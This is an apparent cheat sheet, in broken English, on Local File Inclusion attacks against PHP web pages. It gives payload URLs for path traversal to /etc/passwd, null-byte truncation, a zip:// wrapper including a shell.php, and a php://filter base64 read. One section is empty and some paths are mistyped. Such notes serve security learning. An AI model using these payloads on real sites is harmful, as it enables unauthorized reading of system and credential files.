![file-upload-sheetcheatschema](https://github.com/user-attachments/assets/ac268e3d-d681-4f13-93f7-ba515f20e441)

# LFI (Local File Inclusion)

## 1. Classique
**Explanation :** Why use the variable "page" for include other file. And ../ for return to folder before. 
**Example :** http://www.exemple.com/?page=example.php
http://www.exemple.com/?page=../../../etc/.passwd

## 2. Null byte
**Explanation : ** .php was incremented automaticaly to photo, like lang=eng, so we use %00 for separate de extension added. 
**Exemple : ** http://www.exemple.com/?page=photo
http://www.exemple.com/?page=../../../etc/passwd%00

## 3. Double encoding
**Explanation : **
**Exemple : ** http://www.exemple.com/?page=
http://www.exemple.com/?page=

## 4. Wrappers
**Explanation : ** wrapper is for apply filter. We have :
phar://
zip://
**Example :** zip://tmp/file.zip%23shell.php
tar://
php://
**Exemple : ** http://www.exemple.com/?page=/etc/.passwd (permission denied)
http://www.exemple.com/?page= php://filter/convert.base64-encode/resource=/etc/.passwd
